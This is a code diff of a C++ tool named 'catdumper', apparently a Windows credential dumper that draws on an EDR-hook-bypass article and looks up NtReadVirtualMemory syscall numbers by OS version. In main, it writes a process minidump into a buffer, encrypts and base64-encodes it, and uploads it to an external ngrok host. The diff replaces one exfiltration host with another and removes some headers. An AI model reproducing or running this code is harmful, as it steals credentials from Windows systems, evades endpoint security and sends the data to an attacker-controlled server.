@@ -7,25 +7,7 @@
 // https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
 // 
 
-#define NOMINMAX
 #include "catdumper.h"
-#include <windows.h>
-#include <wincrypt.h>
-#include <winhttp.h>
-#include <dbghelp.h>
-#include <tlhelp32.h>
-#include <processsnapshot.h>
-#include <iostream>
-#include <string>
-#include <random>
-#include <vector>
-#include <chrono>
-#include <thread>
-
-#pragma comment (lib, "ntdll")
-#pragma comment (lib, "crypt32")
-#pragma comment (lib, "winhttp")
-#pragma comment (lib, "dbghelp")
 
 // Buffer for saving the minidump
 const size_t dumpBufferSize = 1024 * 1024 * 100; // Size of the dump buffer
@@ -149,12 +131,6 @@ BYTE GetNtRVM() {
 	auto osVerInfo = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };
 	_RtlGetVersion((POSVERSIONINFOW)&osVerInfo);
 	auto version_long = (osVerInfo.dwMajorVersion << 16) | (osVerInfo.dwMinorVersion << 8) | osVerInfo.wServicePackMajor;
-	enum supported_versions
-	{
-		win8 = 0x060200,
-		win81 = 0x060300,
-		win10 = 0x0A0000,
-	};
 
 	//                    7 and Pre-7     2012SP0   2012-R2    8.0     8.1    Windows 10+
 	//NtReadVirtualMemory 0x003c 0x003c    0x003d   0x003e    0x003d 0x003e 0x003f 0x003f 
@@ -436,9 +412,9 @@ int main() {
 		std::string data = Base64Encode(EncryptDump(dumpBuffer, bytesRead, key));
 
 		//SendDataInChunks(data, "catflask.meowmycks.com", "/upload");
-		SendDataInChunks(data, "30f7-154-47-22-66.ngrok-free.app", "/upload");
+		SendDataInChunks(data, "9251-146-70-202-179.ngrok-free.app", "/upload");
 		//SendHTTPSRequest("catflask.meowmycks.com", "/upload", key, true);
-		SendHTTPSRequest("30f7-154-47-22-66.ngrok-free.app", "/upload", key, true);
+		SendHTTPSRequest("9251-146-70-202-179.ngrok-free.app", "/upload", key, true);
 	}
 	else // wtf happened???
 		std::wcout << L"Dump failed. " << err << std::endl;
